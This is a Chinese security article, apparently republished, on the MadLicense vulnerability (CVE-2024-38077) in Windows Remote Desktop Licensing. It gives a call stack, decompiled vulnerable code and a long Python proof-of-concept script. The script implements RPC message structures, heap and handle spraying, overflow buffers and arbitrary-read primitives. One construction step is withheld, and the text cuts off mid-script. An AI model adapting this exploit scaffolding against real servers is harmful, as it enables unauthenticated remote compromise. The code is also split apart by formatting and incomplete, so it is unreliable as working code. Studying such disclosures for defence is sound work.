#  Windows超高危漏洞“狂躁许可”实际利用全过程曝光！（附POC）   
 网安加社区   2024-08-09 18:28  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/nmic4AsdMAVYa31awNqib0Zlibby9icR9TkIibdG3CqHYQcSCUeslYXk4yfPLHEU3j7gkDRe6kQHrtS9MMvPu9faKjQ/640?wx_fmt=gif "")  
  
  
自"永恒之蓝"之后，  
**Windows再次暴露出一个影响全版本且高度稳定可利用的预认证远程代码执行（RCE）漏洞。**  
  
  
**本文将跟随漏洞披露者的第一视角，详细探讨漏洞的技术原理、利用方法，并提供相关的概念验证伪代码。**  
文章同时附有演示视频，展示了该漏洞在最新的Windows Server 2025上的实际利用过程。  
  
  
值得注意的是，作者声称已提前向微软报告了此漏洞。然而，微软初步判定该漏洞"不太可能被利用"。  
鉴于此，作者决定采取负责任的披露方式，旨在提高业界的安全警惕性，并敦促用户及时更新系统以防潜在风险。  
  
  
这一发现不仅凸显了持续性安全研究的重要性，也再次提醒我们即便是最新的系统也可能存在严重漏洞。  
它将如何影响网络安全格局，值得我们持续关注。  
  
  
  
**远程桌面服务漏洞利用系列**  
  
**狂躁许可：一个漏洞主宰全局**  
  
  
**背景**  
  
  
在今年初，我们对Windows远程桌面服务展开了全面深入的安全审计。这次审计揭示了一系列严重漏洞，我们已向微软报告了总计56个安全问题。  
  
  
其中最为突出的是远程桌面许可服务中发现的几个**预认证远程代码执行（RCE）漏洞。**  
这些漏洞的特殊之处在于它们是未经身份验证的非沙箱化零点击RCE，可以被用来构建针对Windows远程桌面许可服务的多种预认证RCE攻击。  
  
  
值得注意的是，这类零点击预认证RCE漏洞在Windows系统中已经多年未见。由于其潜在的巨大危害，我们将这些漏洞形象地命名为"疯狂"、"恶劣"和"致命"许可漏洞。  
  
  
本文作为揭示这些高危漏洞系列的开篇之作，将为读者详细介绍这些安全威胁的本质和影响。  
  
  
**本文重点介绍CVE-2024-38077漏洞，我们将其命名为MadLicense【狂躁许可】。**  
**我们选择在配备最新安全措施的Windows Server 2025上演示此漏洞的利用，以突显其严重性。**  
  
  
尽管微软宣称该版本具有下一代安全改进，但这个漏洞仍然影响了从Windows Server 2000到2025的所有版本。  
  
  
为了平衡信息披露和安全考虑，我们不会提供详细的技术说明或完整的概念验证（POC）。相反，我们提供了足以理解漏洞本质的伪代码。这些代码不足以触发或利用漏洞，但足以证明其潜在危险性。  
  
  
值得注意的是，尽管我们一个月前就告知微软此漏洞可被利用，但微软仍将其标记为"不太可能被利用"。  
  
  
鉴于此，我们决定进行负责任的披露。**我们的目标是提高安全意识，促使用户及时更新系统，并为安全专家提供足够的信息来开发防御措施。**  
  
  
我们希望通过这种方式，在真正的攻击出现之前，为防御者提供充足的准备时间，同时也敦促相关方面重视并解决这一严重的安全隐患。  
  
  
**介绍**  
  
  
2024年7月，微软修复了我们报告的**以下7个与RDP（远程桌面协议）相关的漏洞：**  
  
  
   
CVE-2024-38077: Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability  
  
CVE-2024-38077: Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability  
  
CVE-2024-38076: Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability  
  
CVE-2024-38074: Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability  
  
CVE-2024-38073: Windows Remote Desktop Licensing Service Denial of Service Vulnerability  
  
CVE-2024-38072: Windows Remote Desktop Licensing Service Denial of Service Vulnerability  
  
CVE-2024-38071: Windows Remote Desktop Licensing Service Denial of Service Vulnerability  
  
CVE-2024-38015: Windows Remote Desktop Gateway (RD Gateway) Denial of Service Vulnerability  
  
在这些漏洞中，特别值得关注的是三个针对Windows远程桌面许可服务的远程代码执行（RCE）漏洞，它们的CVSS评分高达9.8。  
  
  
尽管微软在其公告中认为这些漏洞"不太可能被利用"，但事实却并非如此。我们在补丁发布前就已经向微软证实了这些漏洞的可利用性。  
  
  
本文将重点展示如何在最新的Windows Server 2025上利用CVE-2024-38077这一预认证RCE漏洞。  
  
  
**我们将演示如何绕过所有现代安全防护机制，实现零点击远程代码执行。**  
令人震惊的是，仅凭这一个漏洞，攻击者就能在无需任何用户交互的情况下完成攻击。这凸显了该漏洞的严重性和紧迫的修复需求。  
  
  
**远程桌面许可（RDL）服务**  
  
  
远程桌面许可服务是Windows Server的核心组件之一，主要负责管理和分发远程桌面服务的许可证，确保用户能够安全合规地访问远程应用程序和桌面环境。  
  
  
RDL服务在启用远程桌面服务的系统中被广泛部署。默认情况下，远程桌面服务仅允许两个并发会话。若需支持更多同时连接，则必须购买额外的许可证，而RDL服务就是管理这些许可证的关键。  
  
  
值得注意的是，RDL服务的普及还源于一个常见做法：管理员在Windows服务器上安装远程桌面服务（使用3389端口）时，往往会选择同时安装RDL服务。这导致大量开启3389端口的服务器也同时启用了RDL服务。  
  
  
在开始对RDL服务进行安全审计之前，我们进行了一次全面的网络扫描，以评估RDL服务在互联网上的部署情况。  
  
  
结果令人担忧：我们发现至少有17万个活跃的RDL服务直接暴露在公共互联网上，而内部网络中的数量无疑更为庞大。更为严重的是，RDL服务常常部署在关键业务系统和远程桌面集群中。  
  
  
因此，RDL服务中存在的预认证远程代码执行（RCE）漏洞对整个网络安全环境构成了重大威胁。  
  
  
**CVE-2024-38077：一个简单的堆溢出漏洞**  
  
  
终端服务器许可程序旨在管理连接任何用户或设备到服务器所需的终端服务客户端访问许可证（CALs）。在CDataCoding::DecodeData程序中，分配了一个固定大小的缓冲区（21字节），然后用于计算并填充用户可控长度的缓冲区，导致堆溢出。  
  
  
**以下是调用栈和伪代码：**  
  
  
```windbg  
  
0:012> k  
  
 # Child-SP          RetAddr               Call Site  
  
00 000000b9`d2ffbd30 00007fff`67a76fec     lserver!CDataCoding::DecodeData  
  
01 000000b9`d2ffbd70 00007fff`67a5c793     lserver!LKPLiteVerifyLKP+0x38  
  
02 000000b9`d2ffbdc0 00007fff`67a343eb     lserver!TLSDBTelephoneRegisterLicenseKeyPack+0x163  
  
03 000000b9`d2ffd7d0 00007fff`867052a3     lserver!TLSRpcTelephoneRegisterLKP+0x15b  
  
04 000000b9`d2fff0c0 00007fff`8664854d     RPCRT4!Invoke+0x73  
  
05 000000b9`d2fff120 00007fff`86647fda     RPCRT4!NdrStubCall2+0x30d  
  
06 000000b9`d2fff3d0 00007fff`866b7967     RPCRT4!NdrServerCall2+0x1a  
  
07 000000b9`d2fff400 00007fff`86673824     RPCRT4!DispatchToStubInCNoAvrf+0x17  
  
08 000000b9`d2fff450 00007fff`866729e4     RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x194  
  
09 000000b9`d2fff520 00007fff`86688d4a     RPCRT4!RPC_INTERFACE::DispatchToStub+0x1f4  
  
0a 000000b9`d2fff7c0 00007fff`86688af1     RPCRT4!OSF_SCALL::DispatchHelper+0x13a  
  
0b 000000b9`d2fff8e0 00007fff`86687809     RPCRT4!OSF_SCALL::DispatchRPCCall+0x89  
  
0c 000000b9`d2fff910 00007fff`86686398     RPCRT4!OSF_SCALL::ProcessReceivedPDU+0xe1  
  
0d 000000b9`d2fff9b0 00007fff`86697f4c     RPCRT4!OSF_SCONNECTION::ProcessReceiveComplete+0x34c  
  
0e 000000b9`d2fffab0 00007fff`840377f1     RPCRT4!CO_ConnectionThreadPoolCallback+0xbc  
  
0f 000000b9`d2fffb30 00007fff`867f7794     KERNELBASE!BasepTpIoCallback+0x51  
  
10 000000b9`d2fffb80 00007fff`867f7e37     ntdll!TppIopExecuteCallback+0x1b4  
  
11 000000b9`d2fffc00 00007fff`85b11fd7     ntdll!TppWorkerThread+0x547  
  
12 000000b9`d2ffff60 00007fff`8683d9c0     KERNEL32!BaseThreadInitThunk+0x17  
  
13 000000b9`d2ffff90 00000000`00000000     ntdll!RtlUserThreadStart+0x20  
  
```  
  
  
```C  
  
  
void __fastcall CDataCoding::SetInputEncDataLen(CDataCoding *this)  
  
{  
  
    
// ...  
  
  dword_1800D61D0 =   
35;  
  
  v1 = log10_0((  
double)dword_1800D61C8) *   
35.0;  
  
  v2 = v1 / log10_0(  
2.0);  
  
  v3 = (  
int)v2 +   
1;  
  
  v4 =   
0;  
  
    
if ( v2 <= (  
double)(  
int)v2 )  
  
    v3 = (  
int)v2;  
  
  LOBYTE(v4) = (v3 &   
7) !=   
0;  
  
  LODWORD(dwBytes) = (v3 >>   
3) + v4;  
 // dwBytes is a fixed value 21  
  
}  
  
__int64 __fastcall CDataCoding::DecodeData(  
  
        CDataCoding *this,  
  
          
const   
unsigned __int16 *a2,  
  
          
unsigned __int8 **a3,  
  
          
unsigned   
int *a4)  
  
{  
  
    
// ...  
  
  v4 =   
0;  
  
  v8 =   
0;  
  
    
if ( a3 )  
  
  {  
  
      
// dwBytes is a global variable with value 21  
  
    v9 = dwBytes;  
  
    *a3 =   
0i64;  
  
    *a4 =   
0;  
  
    ProcessHeap = GetProcessHeap();  
  
    v11 = (  
unsigned __int8 *)HeapAlloc(ProcessHeap,   
8u, v9);  
  
    v12 = v11;  
  
      
if ( v11 )  
  
    {  
  
      memset_0(v11,   
0, (  
unsigned   
int)dwBytes);  
  
        
while ( *a2 )  
  
      {  
  
          
// Str is BCDFGHJKMPQRTVWXY2346789  
  
          
// a2 is user-controlled buffer  
  
        v13 = wcschr_0(Str, *a2);  
  
          
if ( !v13 )  
  
        {  
  
          v4 =   
13;  
  
          v18 = GetProcessHeap();  
  
          HeapFree(v18,   
0, v12);  
  
            
return v4;  
  
        }  
  
          
// here change the integer a2 from base 24 to base 10  
  
          
// but does not check the length of a2  
  
        v14 = v13 - Str;  
  
        v15 = v12;  
  
        v16 = (  
unsigned   
int)(v8 +   
1);  
  
          
do  
  
        {  
  
          v17 = dword_1800D61C8 * *v15 + v14;  
  
          *v15++ = v17;  
  
          LODWORD(v14) = v17 >>   
8;  
  
          --v16;  
  
        }  
  
          
while ( v16 );  
  
          
if ( (_DWORD)v14 )  
  
          v12[++v8] = v14;  
  
        ++a2;  
  
      }  
  
      *a4 = dwBytes;  
  
      *a3 = v12;  
  
    }  
  
      
else  
  
    {  
  
        
return   
8;  
  
    }  
  
  }  
  
    
else  
  
  {  
  
      
return   
87;  
  
  }  
  
    
return v4;  
  
}  
  
}  
  
```  
  
**概念验证（POC）伪代码**  
  
  
**本节我们将展示漏洞利用的基本原理。**  
详细的技术分析将在本系列的后续文章中深入探讨。需要特别说明的是，此处提供的Python代码仅为伪代码。  
  
  
这  
段代码不足以触发实际漏洞，更无法用于真正的漏洞利用。  
我们提供这些信息的目的是证明漏洞的严重性，同时为安全研究人员和系统管理员提供足够的时间来开发防御措施，防止真正的攻击出现。  
  
  
**验证环境：**  
  
**▪ Windows Server 2025 标准版**  
  
版本：  
24H2 (26236.5000.amd64fre.ge_prerelease.240607-1502)  
  
▪ **lserver.dll 版本**：10.0.26235.5000  
  
  
  
 ```  
  
import struct  
, hashlib  
, argparse  
  
from time   
import sleep  
  
from impacket  
.dcerpc  
.v5   
import transport  
, epm  
  
from impacket  
.dcerpc  
.v5  
.rpcrt   
import DCERPCException  
  
from impacket  
.dcerpc  
.v5  
.ndr   
import NDRUniConformantArray  
,   
NDRPOINTER  
,   
NDRSTRUCT  
,   
NDRCALL  
  
from impacket  
.dcerpc  
.v5  
.dtypes   
import   
BOOL  
,  
ULONG  
,   
DWORD  
,   
PULONG  
,   
PWCHAR  
,   
PBYTE  
,   
WIDESTR  
,   
UCHAR  
,   
WORD  
,   
BBYTE  
,   
LPSTR  
,   
PUINT  
,   
WCHAR  
  
from impacket  
.uuid   
import uuidtup_to_bin  
  
from Crypto  
.Util  
.number   
import bytes_to_long  
  
from wincrypto   
import CryptEncrypt  
, CryptImportKey  
  
UUID   
= uuidtup_to_bin  
(("  
3d267954-eeb7-11d1-b94e-00c04fa3080d  
",   
"  
1.0  
"))  
  
TRY_TIMES   
=   
3  
  
SLEEP_TIME   
=   
210  
  
DESCRIPTION   
=   
"  
MadLicense: Windows Remote Desktop Licensing Service Preauth RCE  
"  
  
dce   
=   
None  
  
rpctransport   
=   
None  
  
ctx_handle   
=   
None  
  
handle_lists   
=   
[]  
  
leak_idx   
=   
0  
  
heap_base   
=   
0  
  
ntdll_base   
=   
0  
  
peb_base   
=   
0  
  
pe_base   
=   
0  
  
rpcrt4_base   
=   
0  
  
kernelbase_base   
=   
0  
  
def **p8**  
(  
x  
):  
  
      
return struct  
.pack  
("  
B  
", x  
)  
  
def **p16**  
(  
x  
):  
  
      
return struct  
.pack  
("  
H  
", x  
)  
  
def **p32**  
(  
x  
):  
  
      
return struct  
.pack  
("  
I  
", x  
)  
  
def **p64**  
(  
x  
):  
  
      
return struct  
.pack  
("  
Q  
", x  
)  
  
class **CONTEXT_HANDLE**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
Data  
",   
"  
20s=b  
"),  
  
      
)  
  
      
def **getAlignment**  
(  
self  
):  
  
          
return   
4  
  
class **TLSRpcGetVersion**  
(  
NDRCALL  
):  
  
    opnum   
=   
0  
  
    structure   
=   
(  
  
          
("  
ctx_handle  
",   
CONTEXT_HANDLE  
),  
  
          
("  
version  
",   
PULONG  
),  
  
      
)  
  
class **TLSRpcGetVersionResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
version  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcConnect**  
(  
NDRCALL  
):  
  
    opnum   
=   
1  
  
class **TLSRpcConnectResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
ctx_handle  
",   
CONTEXT_HANDLE  
),  
  
      
)  
  
class **TLSBLOB**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
cbData  
",   
ULONG  
),  
  
          
("  
pbData  
",   
PBYTE  
),  
  
      
)  
  
class **TLSCRYPT_ALGORITHM_IDENTIFIER**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
pszObjId  
",   
LPSTR  
),  
  
          
("  
Parameters  
",   
TLSBLOB  
),  
  
      
)  
  
class **TLSCRYPT_BIT_BLOB**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
cbData  
",   
DWORD  
),  
  
          
("  
pbData  
",   
PBYTE  
),  
  
          
("  
cUnusedBits  
",   
DWORD  
),  
  
      
)  
  
class **TLSCERT_PUBLIC_KEY_INFO**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
Algorithm  
",   
TLSCRYPT_ALGORITHM_IDENTIFIER  
),  
  
          
("  
PublicKey  
",   
TLSCRYPT_BIT_BLOB  
),  
  
      
)  
  
class **PTLSCERT_PUBLIC_KEY_INFO**  
(  
NDRPOINTER  
):  
  
    referent   
=   
(  
  
          
("  
Data  
",   
TLSCERT_PUBLIC_KEY_INFO  
),  
  
      
)  
  
class **TLSCERT_EXTENSION**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
pszObjId  
",   
LPSTR  
),  
  
          
("  
fCritical  
",   
BOOL  
),  
  
          
("  
Value  
",   
TLSBLOB  
),  
  
      
)  
  
class **TLSCERT_EXTENSION_ARRAY**  
(**NDRUniConformantArray**  
):  
  
    item   
=   
TLSCERT_EXTENSION  
  
class **PTLSCERT_EXTENSION**  
(  
NDRPOINTER  
):  
  
    referent   
=   
(  
  
          
("  
Data  
",   
TLSCERT_EXTENSION_ARRAY  
),  
  
      
)  
  
class **TLSHYDRACERTREQUEST**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
dwHydraVersion  
",   
DWORD  
),  
  
          
("  
cbEncryptedHwid  
",   
DWORD  
),  
  
          
("  
pbEncryptedHwid  
",   
PBYTE  
),  
  
          
("  
szSubjectRdn  
",   
PWCHAR  
),  
  
          
("  
pSubjectPublicKeyInfo  
",   
PTLSCERT_PUBLIC_KEY_INFO  
),  
  
          
("  
dwNumCertExtension  
",   
DWORD  
),  
  
          
("  
pCertExtensions  
",   
PTLSCERT_EXTENSION  
),  
  
      
)  
  
class **PTLSHYDRACERTREQUEST**  
(  
NDRPOINTER  
):  
  
    referent   
=   
(  
  
          
("  
Data  
",   
TLSHYDRACERTREQUEST  
),  
  
      
)  
  
class **TLSRpcRequestTermServCert**  
(  
NDRCALL  
):  
  
    opnum   
=   
34  
  
    structure   
=   
(  
  
          
("  
phContext  
",   
CONTEXT_HANDLE  
),  
  
          
("  
pbRequest  
",   
TLSHYDRACERTREQUEST  
),  
  
          
("  
cbChallengeData  
",   
DWORD  
),  
  
          
("  
pdwErrCode  
",   
DWORD  
),  
  
      
)  
  
class **TLSRpcRequestTermServCertResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
cbChallengeData  
",   
ULONG  
),  
  
          
("  
pbChallengeData  
",   
PBYTE  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcRetrieveTermServCert**  
(  
NDRCALL  
):  
  
    opnum   
=   
35  
  
    structure   
=   
(  
  
          
("  
phContext  
",   
CONTEXT_HANDLE  
),  
  
          
("  
cbResponseData  
",   
DWORD  
),  
  
          
("  
pbResponseData  
",   
BBYTE  
),  
  
          
("  
cbCert  
",   
DWORD  
),  
  
          
("  
pbCert  
",   
BBYTE  
),  
  
          
("  
pdwErrCode  
",   
DWORD  
),  
  
      
)  
  
class **TLSRpcRetrieveTermServCertResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
cbCert  
",   
PUINT  
),  
  
          
("  
pbCert  
",   
BBYTE  
),  
  
          
("  
pdwErrCode  
",   
PUINT  
),  
  
      
)  
  
class **TLSRpcTelephoneRegisterLKP**  
(  
NDRCALL  
):  
  
    opnum   
=   
49  
  
    structure   
=   
(  
  
          
("  
ctx_handle  
",   
CONTEXT_HANDLE  
),  
  
          
("  
dwData  
",   
ULONG  
),  
  
          
("  
pbData  
",   
BBYTE  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
)  
  
      
)  
  
class **TLSRpcTelephoneRegisterLKPResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
pdwErrCode  
",   
ULONG  
)  
  
      
)  
  
class **TLSCHALLENGEDATA**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
dwVersion  
",   
ULONG  
),  
  
          
("  
dwRandom  
",   
ULONG  
),  
  
          
("  
cbChallengeData  
",   
ULONG  
),  
  
          
("  
pbChallengeData  
",   
PBYTE  
),  
  
          
("  
cbReservedData  
",   
ULONG  
),  
  
          
("  
pbReservedData  
",   
PBYTE  
),  
  
      
)  
  
class **PTLSCHALLENGEDATA**  
(  
NDRPOINTER  
):  
  
    referent   
=   
(  
  
          
("  
Data  
",   
TLSCHALLENGEDATA  
),  
  
      
)  
  
class **TLSCHALLENGERESPONSEDATA**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
dwVersion  
",   
ULONG  
),  
  
          
("  
cbResponseData  
",   
ULONG  
),  
  
          
("  
pbResponseData  
",   
PBYTE  
),  
  
          
("  
cbReservedData  
",   
ULONG  
),  
  
          
("  
pbReservedData  
",   
PBYTE  
),  
  
      
)  
  
class **PTLSCHALLENGERESPONSEDATA**  
(  
NDRPOINTER  
):  
  
    referent   
=   
(  
  
          
("  
Data  
",   
TLSCHALLENGERESPONSEDATA  
),  
  
      
)  
  
class **TLSRpcChallengeServer**  
(  
NDRCALL  
):  
  
    opnum   
=   
44  
  
    structure   
=   
(  
  
          
("  
phContext  
",   
CONTEXT_HANDLE  
),  
  
          
("  
dwClientType  
",   
ULONG  
),  
  
          
("  
pClientChallenge  
",   
TLSCHALLENGEDATA  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcChallengeServerResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
pServerResponse  
",   
PTLSCHALLENGERESPONSEDATA  
),  
  
          
("  
pServerChallenge  
",   
PTLSCHALLENGEDATA  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcResponseServerChallenge**  
(  
NDRCALL  
):  
  
    opnum   
=   
45  
  
    structure   
=   
(  
  
          
("  
phContext  
",   
CONTEXT_HANDLE  
),  
  
          
("  
pClientResponse  
",   
TLSCHALLENGERESPONSEDATA  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcResponseServerChallengeResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcRegisterLicenseKeyPack**  
(  
NDRCALL  
):  
  
    opnum   
=   
38  
  
    structure   
=   
(  
  
          
("  
lpContext  
",   
CONTEXT_HANDLE  
),  
  
          
("  
arg_1  
",   
BBYTE  
),  
  
          
("  
arg_2  
",   
ULONG  
),  
  
          
("  
arg_3  
",   
BBYTE  
),  
  
          
("  
arg_4  
",   
ULONG  
),  
  
          
("  
lpKeyPackBlob  
",   
BBYTE  
),  
  
          
("  
arg_6  
",   
ULONG  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcRegisterLicenseKeyPackResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **WIDESTR_STRIPPED**  
(  
WIDESTR  
):  
  
    length   
=   
None  
  
      
def **__getitem__**  
(  
self  
,   
key  
):  
  
          
if key   
==   
'  
Data  
':  
  
              
return   
self  
.fields  
[key  
].decode  
('  
utf-16le  
').rstrip  
('\x00')  
  
          
else  
:  
  
              
return   
NDR  
.**__getitem__**  
(  
self  
,key  
)  
  
      
def **getDataLen**  
(  
self  
,   
data  
,   
offset  
=  
0  
):  
  
          
if   
self  
.length   
is   
None  
:  
  
              
return   
super  
().getDataLen  
(data  
, offset  
)  
  
          
return   
self  
.length   
*   
2  
  
class **WCHAR_ARRAY_256**  
(  
WIDESTR_STRIPPED  
):  
  
    length   
=   
256  
  
class **LSKeyPack**  
(  
NDRSTRUCT  
):  
  
    structure   
=   
(  
  
          
("  
dwVersion  
",   
DWORD  
),  
  
          
("  
ucKeyPackType  
",   
UCHAR  
),  
  
          
("  
szCompanyName  
",   
WCHAR_ARRAY_256  
),  
  
          
("  
szKeyPackId  
",   
WCHAR_ARRAY_256  
),  
  
          
("  
szProductName  
",   
WCHAR_ARRAY_256  
),  
  
          
("  
szProductId  
",   
WCHAR_ARRAY_256  
),  
  
          
("  
szProductDesc  
",   
WCHAR_ARRAY_256  
),  
  
          
("  
wMajorVersion  
",   
WORD  
),  
  
          
("  
wMinorVersion  
",   
WORD  
),  
  
          
("  
dwPlatformType  
",   
DWORD  
),  
  
          
("  
ucLicenseType  
",   
UCHAR  
),  
  
          
("  
dwLanguageId  
",   
DWORD  
),  
  
          
("  
ucChannelOfPurchase  
",   
UCHAR  
),  
  
          
("  
szBeginSerialNumber  
",   
WCHAR_ARRAY_256  
),  
  
          
("  
dwTotalLicenseInKeyPack  
",   
DWORD  
),  
  
          
("  
dwProductFlags  
",   
DWORD  
),  
  
          
("  
dwKeyPackId  
",   
DWORD  
),  
  
          
("  
ucKeyPackStatus  
",   
UCHAR  
),  
  
          
("  
dwActivateDate  
",   
DWORD  
),  
  
          
("  
dwExpirationDate  
",   
DWORD  
),  
  
          
("  
dwNumberOfLicenses  
",   
DWORD  
),  
  
      
)  
  
class **LPLSKeyPack**  
(  
NDRPOINTER  
):  
  
    referent   
=   
(  
  
          
("  
Data  
", LSKeyPack  
),  
  
      
)  
  
class **TLSRpcKeyPackEnumNext**  
(  
NDRCALL  
):  
  
    opnum   
=   
13  
  
    structure   
=   
(  
  
          
("  
phContext  
",   
CONTEXT_HANDLE  
),  
  
          
("  
lpKeyPack  
", LPLSKeyPack  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcKeyPackEnumNextResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcDisconnect**  
(  
NDRCALL  
):  
  
    opnum   
=   
2  
  
    structure   
=   
(  
  
          
("  
ctx_handle  
",   
CONTEXT_HANDLE  
),  
  
      
)  
  
class **TLSRpcDisconnectResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
ctx_handle  
",   
CONTEXT_HANDLE  
),  
  
      
)  
  
class **TLSRpcGetServerName**  
(  
NDRCALL  
):  
  
    opnum   
=   
4  
  
    structure   
=   
(  
  
          
("  
ctx_handle  
",   
CONTEXT_HANDLE  
),  
  
          
("  
serverName  
",   
WCHAR  
),  
  
          
("  
nameLen  
",   
ULONG  
),  
  
          
("  
errCode  
",   
ULONG  
),  
  
      
)  
  
class **TLSRpcGetServerNameResponse**  
(  
NDRCALL  
):  
  
    structure   
=   
(  
  
          
("  
serverName  
",   
WCHAR  
),  
  
          
("  
nameLen  
",   
ULONG  
),  
  
          
("  
pdwErrCode  
",   
ULONG  
),  
  
      
)  
  
def **b24encode**  
(  
data  
,   
charmap  
):  
  
    data   
= data  
[::-  
1  
]  
  
    data   
= bytes_to_long  
(data  
)  
  
    enc   
=   
b  
""  
  
      
while data   
!=   
0  
:  
  
        tmp   
= data   
% **len**  
(charmap  
)  
  
        data   
//= **len**  
(charmap  
)  
  
        enc   
+= charmap  
[tmp  
]  
  
      
return enc  
[::-  
1  
]  
  
def **spray_lfh_chunk**  
(  
size  
,   
loopsize  
):  
  
    payload   
=   
b  
"\x00"   
* size  
  
    reg_lic_keypack   
= construct_TLSRpcRegisterLicenseKeyPack  
(payload  
)  
  
      
for _   
in **range**  
(loopsize  
):  
  
        dce  
.request  
(reg_lic_keypack  
)  
  
def **disconnect**  
(  
handle  
):  
  
      
global dce  
  
    disconn   
= TLSRpcDisconnect  
()  
  
    disconn  
["  
ctx_handle  
"]   
= handle  
  
    disconn_res   
= dce  
.request  
(disconn  
)  
  
    ret   
= disconn_res  
["  
ctx_handle  
"]  
  
      
return ret  
  
def **handles_free**  
():  
  
      
global handle_lists  
, heap_base  
  
    sleep  
(  
7  
)  
  
      
for i   
in **range**  
(  
0x  
8  
):  
  
        handle   
= handle_lists  
[  
0x  
400   
+ i   
*   
2  
]  
  
        disconnect  
(handle  
)  
  
        handle_lists  
.remove  
(handle  
)    
  
def **spray_handles**  
(  
times  
):  
  
      
global dce  
, handle_lists  
  
    handle_lists   
=   
[]  
  
      
for _   
in **range**  
(times  
):  
  
        rpc_conn   
= TLSRpcConnect  
()  
  
        res_rpc_conn   
= dce  
.request  
(rpc_conn  
)  
  
        handle   
= res_rpc_conn  
["  
ctx_handle  
"]  
  
        handle_lists  
.append  
(handle  
)  
  
def **spray_fake_obj**  
(  
reg_lic_keypack  
,   
times   
=   
0x  
300  
):  
  
      
global dce  
  
      
for i   
in **range**  
(times  
):  
  
        dce  
.request  
(reg_lic_keypack  
)  
  
def **construct_TLSRpcTelephoneRegisterLKP**  
(  
payload  
):  
  
      
global ctx_handle  
  
    **print**  
("  
Hidden to prevent abusing  
")  
  
      
return tls_register_LKP  
  
def **construct_overflow_arbread_buf**  
(  
addr  
,   
padding  
):  
  
    payload   
=   
b  
""  
  
    payload   
+= p64  
(addr  
)  
  
      
if padding  
:  
  
        payload   
+= p32  
(  
0  
)  
  
        payload   
+= p32  
(  
0  
)  
  
        payload   
+= p32  
(  
1  
)  
  
    tls_register_LKP   
= construct_TLSRpcTelephoneRegisterLKP  
(payload  
)  
  
      
return tls_register_LKP  
  
def **construct_overflow_fake_obj_buf**  
(  
fake_obj_addr  
):  
  
    payload   
=   
b  
""  
  
    payload   
+= p64  
(  
0  
)  
  
    payload   
+= p32  
(  
0  
)  
  
    payload   
+= p32  
(  
1  
)  
  
    payload   
+= p32  
(  
0  
)  
  
    payload   
+= p32  
(  
1  
)  
  
    payload   
+= p64  
(fake_obj_addr  
)  
  
    payload   
+= p8  
(  
1  
)  
  
    tls_register_LKP   
= construct_TLSRpcTelephoneRegisterLKP  
(payload  
)  
  
      
return tls_register_LKP  
  
def **arb_read**  
(  
addr  
,   
padding   
=   
False  
,   
passZero   
=   
False  
,   
leakHeapBaseOffset   
=   
0  
):  
  
      
global leak_idx  
, handle_lists  
, dce  
, ctx_handle  
  
      
if leakHeapBaseOffset   
!=   
0  
:  
  
        spray_lfh_chunk  
(  
0x  
20  
,   
0x  
800  
)  
  
      
else  
:  
  
        spray_lfh_chunk  
(  
0x  
20  
,   
0x  
400  
)  
  
    spray_handles  
(  
0x  
c00  
)  
  
    handles_free  
()  
  
    serverName   
=   
"  
a  
"   
*   
0x  
10  
  
    get_server_name   
= TLSRpcGetServerName  
()  
  
    get_server_name  
["  
serverName  
"]   
= serverName   
+   
"\x00"  
  
    get_server_name  
["  
nameLen  
"]   
= **len**  
(serverName  
)   
+   
1  
  
    get_server_name  
["  
errCode  
"]   
=   
0  
  
      
if leakHeapBaseOffset   
!=   
0  
:  
  
        tls_register_LKP   
= construct_overflow_arbread_buf  
(addr  
[  
0  
], padding  
)  
  
      
else  
:  
  
        tls_register_LKP   
= construct_overflow_arbread_buf  
(addr  
, padding  
)  
  
    pbData   
=   
b  
"  
c  
"   
*   
0x  
10  
  
    tls_blob   
= TLSBLOB  
()  
  
    tls_blob  
["  
cbData  
"]   
= **len**  
(pbData  
)  
  
    tls_blob  
["  
pbData  
"]   
= pbData  
  
    tls_cert_extension   
= TLSCERT_EXTENSION  
()  
  
    tls_cert_extension  
["  
pszObjId  
"]   
=   
"  
d  
"   
*   
0x  
10   
+   
"\x00"  
  
    tls_cert_extension  
["  
fCritical  
"]   
=   
False  
  
    tls_cert_extension  
["  
Value  
"]   
= tls_blob  
  
    pbData2   
